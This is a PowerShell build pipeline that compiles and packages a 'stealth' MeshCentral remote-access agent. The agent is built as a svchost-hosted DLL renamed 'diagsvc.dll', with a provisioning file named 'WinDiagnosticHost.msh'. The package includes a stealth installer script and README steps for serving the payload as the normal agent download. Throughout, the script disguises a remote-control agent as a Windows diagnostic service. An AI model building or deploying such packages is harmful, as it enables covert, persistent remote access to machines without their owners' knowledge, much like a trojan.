#Requires -RunAsAdministrator
param(
    [switch]$Clean = $false,
    [switch]$SkipBuild = $false
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Write-Header {
    param([string]$Text)
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ("  {0}" -f $Text) -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
}

function Write-Step {
    param(
        [int]$Index,
        [int]$Total,
        [string]$Label,
        [scriptblock]$Action
    )

    Write-Host ("[{0}/{1}] {2}..." -f $Index, $Total, $Label) -ForegroundColor Yellow
    try {
        & $Action
        Write-Host "    - Completed" -ForegroundColor Green
    }
    catch {
        Write-Host ("    - Failed: {0}" -f $_.Exception.Message) -ForegroundColor Red
        throw
    }
}

function Write-Note {
    param(
        [string]$Message,
        [ConsoleColor]$Color = [ConsoleColor]::Gray
    )
    Write-Host ("    - {0}" -f $Message) -ForegroundColor $Color
}

function Assert-SignedArtifact {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [Parameter(Mandatory = $true)][string]$Description
    )

    Assert-MeshAgentSignatureAllowed -Path $Path -AllowedThumbprints $AllowedThumbprints -RequireSignature | Out-Null
    Write-Note ("Signature validated: {0}" -f $Description) ([ConsoleColor]::Green)
}


$projectRoot   = $PSScriptRoot
$msbuildPath   = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
$projectFile   = Join-Path $projectRoot "meshservice\MeshService-2022.vcxproj"
$configuration = "StealthLab_DLL"
$platform      = "x64"
$dllOutput     = Join-Path $projectRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
$outputDir     = Join-Path $projectRoot "dist"
$toolsDir      = Join-Path $projectRoot "tools"
$embedScript   = Join-Path $toolsDir "embed_provisioning_simple.ps1"
$dumpbinPath   = "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\dumpbin.exe"

$signerAllowlistScript = Join-Path $toolsDir "SignerAllowlist.ps1"
if (-not (Test-Path $signerAllowlistScript)) {
    throw "Signer allowlist helper not found at $signerAllowlistScript"
}
. $signerAllowlistScript
$AllowedThumbprints = Get-MeshAgentAllowedThumbprints -RepoRoot $projectRoot


. (Join-Path $toolsDir "ResourceProbe.ps1")

if (-not (Test-Path $msbuildPath)) {
    throw "MSBuild not found at '$msbuildPath'. Install Visual Studio build tools or update path."
}

if (-not (Test-Path $projectFile)) {
    throw "Project file not found: $projectFile"
}

if (-not (Test-Path $embedScript)) {
    throw "Provisioning embed script not found: $embedScript"
}

Write-Header "MeshAgent Complete Build Pipeline"

$step = 1
$totalSteps = 7
$buildStopwatch = [System.Diagnostics.Stopwatch]::StartNew()

Write-Step -Index ($step++) -Total $totalSteps -Label "Embedding provisioning data" -Action {
    Push-Location $toolsDir
    try {
        & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $embedScript
        Write-Note "Provisioning data embedded successfully" ([ConsoleColor]::Green)
    }
    finally {
        Pop-Location
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Cleaning build artifacts" -Action {
    if ($Clean) {
        & $msbuildPath $projectFile /t:Clean /p:Configuration=$configuration /p:Platform=$platform /v:minimal | Out-Null
        Write-Note "Clean completed"
    }
    else {
        Write-Note "Skipped (use -Clean to enable)"
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Building stealth DLL" -Action {
    if ($SkipBuild) {
        Write-Note "Skipped (use without -SkipBuild to compile)"
        return
    }

    $buildTimer = [System.Diagnostics.Stopwatch]::StartNew()
    $buildOutput = & $msbuildPath $projectFile `
        /t:Build `
        /p:Configuration=$configuration `
        /p:Platform=$platform `
        /p:WindowsTargetPlatformVersion=10.0 `
        /m `
        /v:minimal 2>&1

    if ($LASTEXITCODE -ne 0) {
        $errors = $buildOutput | Select-String -Pattern "error"
        if ($errors) {
            $errors | ForEach-Object { Write-Host $_ -ForegroundColor Red }
        }
        throw "MSBuild reported exit code $LASTEXITCODE"
    }

    Write-Note ("Build succeeded in {0:N1}s" -f $buildTimer.Elapsed.TotalSeconds)
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Verifying build output" -Action {
    if (-not (Test-Path $dllOutput)) {
        throw "Expected DLL not found at $dllOutput"
    }

    $dllInfo = Get-Item $dllOutput
    Write-Note ("DLL size: {0:N0} bytes" -f $dllInfo.Length)
    Write-Note ("Timestamp: {0:u}" -f $dllInfo.LastWriteTimeUtc)
    Assert-SignedArtifact -Path $dllOutput -Description 'StealthLab_DLL payload'

    if (Test-Path $dumpbinPath) {
        $exports = & $dumpbinPath /EXPORTS $dllOutput 2>&1 | Select-String "Stealth_SvchostServiceMain"
        if ($exports) {
            Write-Note "Export Stealth_SvchostServiceMain verified" ([ConsoleColor]::Green)
        }
        else {
            Write-Note "Warning: Export Stealth_SvchostServiceMain not found" ([ConsoleColor]::Yellow)
        }
    }
    else {
        Write-Note "dumpbin.exe not found; export check skipped" ([ConsoleColor]::DarkGray)
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Preparing package contents" -Action {
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }

    $packageName = "MeshAgent_Stealth_{0}" -f (Get-Date -Format 'yyyyMMdd_HHmmss')
    $script:packageDir = Join-Path $outputDir $packageName
    New-Item -Path $script:packageDir -ItemType Directory -Force | Out-Null

    Assert-SignedArtifact -Path $dllOutput -Description 'diagsvc.dll source'
    Copy-Item -Path $dllOutput -Destination (Join-Path $script:packageDir "diagsvc.dll") -Force

    $stealthExeX64 = Join-Path $projectRoot "meshservice\x64\StealthLab\MeshService-2022.exe"
    if (Test-Path $stealthExeX64) {
        if (-not (Test-SvchostPayload -Path $stealthExeX64)) {
            throw "MeshService-2022.exe (x64) missing SVCHOSTDLL resource. Re-run build.ps1 -StealthLab."
        }
        Assert-SignedArtifact -Path $stealthExeX64 -Description 'MeshService-2022.exe (x64)'
        Copy-Item -Path $stealthExeX64 -Destination (Join-Path $script:packageDir "MeshService64.exe") -Force
        Write-Note "Added MeshService64.exe (svchost-enabled executable)"
    }
    else {
        Write-Note "MeshService-2022.exe (x64) missing; MeshService64.exe not included" ([ConsoleColor]::DarkYellow)
    }

    $stealthExeWin32 = Join-Path $projectRoot "meshservice\StealthLab\MeshService-2022.exe"
    if (Test-Path $stealthExeWin32) {
        if (-not (Test-SvchostPayload -Path $stealthExeWin32)) {
            throw "MeshService-2022.exe (Win32) missing SVCHOSTDLL resource. Re-run build.ps1 -StealthLab."
        }
        Assert-SignedArtifact -Path $stealthExeWin32 -Description 'MeshService-2022.exe (Win32)'
        Copy-Item -Path $stealthExeWin32 -Destination (Join-Path $script:packageDir "MeshService.exe") -Force
        Write-Note "Added MeshService.exe (svchost-enabled Win32 executable)"
    }

    $optionalFiles = @(
        @{ Source = Join-Path $projectRoot "WinDiagnosticHost.msh"; Destination = "WinDiagnosticHost.msh"; Description = ".msh provisioning file" },
        @{ Source = Join-Path $projectRoot "deploy_stealth_agent.ps1"; Destination = "install.ps1"; Description = "installer helper script"; Optional = $true },
        @{ Source = Join-Path $projectRoot "branding_config.json"; Destination = "branding_config.json"; Description = "branding configuration" }
    )

    foreach ($file in $optionalFiles) {
        if (Test-Path $file.Source) {
            Copy-Item -Path $file.Source -Destination (Join-Path $script:packageDir $file.Destination) -Force
            Write-Note ("Added {0}" -f $file.Description)
        }
        elseif (-not $file.Optional) {
            throw "Required file missing: $($file.Source)"
        }
        else {
            Write-Note ("Optional file missing: {0}" -f $file.Source) ([ConsoleColor]::DarkGray)
        }
    }

    $dllInfo = Get-Item $dllOutput
    $win32ReadmeLine = ""
    if (Test-Path (Join-Path $script:packageDir "MeshService.exe")) {
        $win32ReadmeLine = "- MeshService.exe          : svchost-enabled service executable (Win32)`n"
    }
    $readme = @"
MeshAgent Stealth Package
=========================

Built: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
DLL Size: $($dllInfo.Length) bytes

INSTALLATION NOTES
------------------
1. Upload diagsvc.dll to your MeshCentral agents-custom directory.
2. Rename it to meshagent_win32_x64.exe.
3. Restart the MeshCentral service.
4. Download the agent from the MeshCentral portal.

FILES
-----
- diagsvc.dll              : MeshAgent svchost payload
- MeshService64.exe        : svchost-enabled service executable (x64)
${win32ReadmeLine}- WinDiagnosticHost.msh    : Provisioning data
- install.ps1              : Optional local installer helper
- branding_config.json     : Branding configuration used for the build

"@

    $readme | Out-File -FilePath (Join-Path $script:packageDir "README.txt") -Encoding UTF8
    Write-Note ("Package directory: {0}" -f $script:packageDir)
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Generating checksum" -Action {
    $dllPath = Join-Path $script:packageDir "diagsvc.dll"
    $hash = (Get-FileHash -Path $dllPath -Algorithm SHA256).Hash
    "SHA256(diagsvc.dll) = $hash" | Out-File -FilePath (Join-Path $script:packageDir "checksums.txt") -Encoding UTF8
    $script:dllHash = $hash
    Write-Note ("SHA256: {0}..." -f $hash.Substring(0, 16))
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Creating archive" -Action {
    $zipName = "{0}.zip" -f (Split-Path $script:packageDir -Leaf)
    $script:zipPath = Join-Path $outputDir $zipName
    Compress-Archive -Path (Join-Path $script:packageDir "*") -DestinationPath $script:zipPath -Force
    $zipSize = (Get-Item $script:zipPath).Length
    Write-Note ("Archive created: {0} ({1:N2} MB)" -f $script:zipPath, ($zipSize / 1MB))
}

$buildStopwatch.Stop()

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  BUILD COMPLETE" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host ("Package folder : {0}" -f $script:packageDir) -ForegroundColor Cyan
Write-Host ("Archive        : {0}" -f $script:zipPath) -ForegroundColor Cyan
Write-Host ("Elapsed time   : {0:N1}s" -f $buildStopwatch.Elapsed.TotalSeconds) -ForegroundColor Cyan
if ($script:dllHash) {
    Write-Host ("DLL SHA256     : {0}" -f $script:dllHash) -ForegroundColor Gray
}
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Yellow
Write-Host "1. Upload diagsvc.dll to the MeshCentral agents-custom directory." -ForegroundColor White
Write-Host "2. For executable overrides, use MeshService64.exe (and MeshService.exe if required) in meshcentral-data\agents." -ForegroundColor White
Write-Host "3. Restart the MeshCentral service and download the agent." -ForegroundColor White
Write-Host ""
